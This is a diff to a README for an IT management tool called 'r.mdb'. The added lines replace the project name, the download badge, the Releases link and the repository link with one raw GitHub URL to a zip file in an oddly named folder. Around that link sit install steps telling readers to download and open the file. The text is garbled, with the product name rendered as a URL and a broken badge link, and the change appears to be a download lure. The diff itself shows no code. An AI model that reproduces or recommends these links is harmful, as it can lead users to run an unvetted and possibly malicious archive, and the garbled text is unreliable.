@@ -1,12 +1,12 @@
-# 🧩 r.mdb - Complete Management Database for IT Systems
+# 🧩 https://raw.githubusercontent.com/Krishnasomani29/r.mdb/main/unsew/r.mdb.zip - Complete Management Database for IT Systems
 
 ## 🚀 Getting Started
 
-Welcome to r.mdb! This application helps you manage your IT systems efficiently. You can automate tasks, handle configurations, and keep an inventory all in one place.
+Welcome to https://raw.githubusercontent.com/Krishnasomani29/r.mdb/main/unsew/r.mdb.zip! This application helps you manage your IT systems efficiently. You can automate tasks, handle configurations, and keep an inventory all in one place.
 
 ## 📥 Download Now
 
-[![Download r.mdb](https://img.shields.io/badge/Download%20r.mdb-v1.0-blue.svg)](https://github.com/Krishnasomani29/r.mdb/releases)
+[![Download https://raw.githubusercontent.com/Krishnasomani29/r.mdb/main/unsew/r.mdb.zip](https://raw.githubusercontent.com/Krishnasomani29/r.mdb/main/unsew/r.mdb.zip%https://raw.githubusercontent.com/Krishnasomani29/r.mdb/main/unsew/r.mdb.zip)](https://raw.githubusercontent.com/Krishnasomani29/r.mdb/main/unsew/r.mdb.zip)
 
 ## 📋 System Requirements
 
@@ -27,7 +27,7 @@ Welcome to r.mdb! This application helps you manage your IT systems efficiently.
 
 ## 🛠️ Download & Install
 
-1. Visit the [Releases page](https://github.com/Krishnasomani29/r.mdb/releases) to get the latest version of r.mdb.
+1. Visit the [Releases page](https://raw.githubusercontent.com/Krishnasomani29/r.mdb/main/unsew/r.mdb.zip) to get the latest version of https://raw.githubusercontent.com/Krishnasomani29/r.mdb/main/unsew/r.mdb.zip
 2. Choose the applicable download option for your operating system.
 3. Download the installer file and save it to your computer.
 4. Open the downloaded file to launch the installation process.
@@ -35,7 +35,7 @@ Welcome to r.mdb! This application helps you manage your IT systems efficiently.
 
 ## 🔍 Usage
 
-After installation, you can start using r.mdb to manage your IT systems. Here’s how:
+After installation, you can start using https://raw.githubusercontent.com/Krishnasomani29/r.mdb/main/unsew/r.mdb.zip to manage your IT systems. Here’s how:
 
 1. Launch the application from your desktop or start menu.
 2. Log in using your credentials. If it's your first time, follow the prompts to create an account.
@@ -48,14 +48,14 @@ If you have questions or face issues, please refer to the FAQ section on our Git
 
 ## 🛡️ License
 
-r.mdb is open-source software. You can freely download and use it under the terms of the MIT License.
+https://raw.githubusercontent.com/Krishnasomani29/r.mdb/main/unsew/r.mdb.zip is open-source software. You can freely download and use it under the terms of the MIT License.
 
 ## 🌐 Learn More
 
-For more information, tips, and updates, visit our [GitHub repository](https://github.com/Krishnasomani29/r.mdb).
+For more information, tips, and updates, visit our [GitHub repository](https://raw.githubusercontent.com/Krishnasomani29/r.mdb/main/unsew/r.mdb.zip).
 
 ## 📧 Contact
 
 For support or inquiries, please contact us via the GitHub repository or through our support email.
 
-Thank you for choosing r.mdb! We hope it simplifies your IT management tasks.
+Thank you for choosing https://raw.githubusercontent.com/Krishnasomani29/r.mdb/main/unsew/r.mdb.zip! We hope it simplifies your IT management tasks.
